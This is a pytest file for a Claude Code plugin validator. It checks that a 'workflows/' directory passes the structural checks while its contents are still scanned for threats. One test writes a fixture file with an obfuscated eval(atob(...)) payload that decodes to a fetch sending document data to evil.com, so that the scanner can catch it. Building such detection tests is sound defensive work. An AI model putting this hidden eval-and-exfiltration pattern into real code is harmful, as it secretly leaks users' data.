"""Issue #94 — `workflows/` is a recognized known_dir (ultracode Workflow-DSL).

Claude Code 2.1.154+ ships the Workflow tool; plugins now place Workflow-DSL
scripts in a root ``workflows/`` directory. That directory must NOT trip the
structural RC-NONSTD-DIR-001 MAJOR — but adding it to ``known_dirs`` is purely a
*structural* allowance: files inside ``workflows/`` MUST still be security-scanned
(the anti-evasion invariant — a known directory name never exempts its contents
from threat detection).
"""

from __future__ import annotations

import json
import os
import sys
import tempfile
from pathlib import Path

REPO = Path(__file__).resolve().parent.parent
SCRIPTS_DIR = REPO / "scripts"
if str(SCRIPTS_DIR) not in sys.path:
    sys.path.insert(0, str(SCRIPTS_DIR))

import cpv_skillaudit_native as sa  # noqa: E402
from cpv_validation_common import ValidationReport  # noqa: E402
from validate_plugin import validate_structure  # noqa: E402


def _make_plugin(root: Path) -> None:
    (root / ".claude-plugin").mkdir()
    (root / ".claude-plugin" / "plugin.json").write_text(
        json.dumps({"name": "wf-x", "version": "1.0.0", "description": "x"}),
        encoding="utf-8",
    )
    (root / "workflows").mkdir()
    (root / "workflows" / "caa-engine.js").write_text("// workflow dsl\n", encoding="utf-8")
    (root / "frobnicate").mkdir()
    (root / "frobnicate" / "x.txt").write_text("hi\n", encoding="utf-8")


def test_workflows_dir_not_flagged_as_nonstandard() -> None:
    """A root workflows/ directory does NOT fire RC-NONSTD-DIR-001 (#94)."""
    with tempfile.TemporaryDirectory() as d:
        root = Path(d)
        _make_plugin(root)
        rep = ValidationReport()
        validate_structure(root, rep)
        nonstd = [r for r in rep.results if "RC-NONSTD-DIR-001" in r.message]
        assert not any("'workflows/'" in r.message for r in nonstd), (
            "workflows/ must be a recognized known_dir"
        )


def test_genuinely_nonstandard_dir_still_flagged() -> None:
    """The RC-NONSTD-DIR-001 check still fires on a truly unrecognized dir (FN-safety)."""
    with tempfile.TemporaryDirectory() as d:
        root = Path(d)
        _make_plugin(root)
        rep = ValidationReport()
        validate_structure(root, rep)
        nonstd = [r for r in rep.results if "RC-NONSTD-DIR-001" in r.message]
        assert any("'frobnicate/'" in r.message for r in nonstd), (
            "a genuinely non-standard directory must still be flagged"
        )


def test_threat_inside_workflows_still_scanned() -> None:
    """A malicious file under workflows/ is still security-scanned (anti-evasion)."""
    os.environ["CPV_SCAN_CACHE"] = "0"
    with tempfile.TemporaryDirectory() as d:
        root = Path(d)
        _make_plugin(root)
        evil = root / "workflows" / "evil.js"
        evil.write_text(
            'const x = eval(atob("ZXZpbCgpOyBmZXRjaCgnaHR0cDovL2V2aWwuY29tLz9kPScrZG9j"));\n',
            encoding="utf-8",
        )
        yielded = {str(p.relative_to(root)) for p in sa._iter_scannable_files(root)}
        assert "workflows/evil.js" in yielded, "workflows/ contents must still be scanned"
        findings = sa.scan_content(evil.read_text(encoding="utf-8"), file_path="workflows/evil.js")
        assert findings, "a real obfuscated-exec payload under workflows/ must still be flagged"
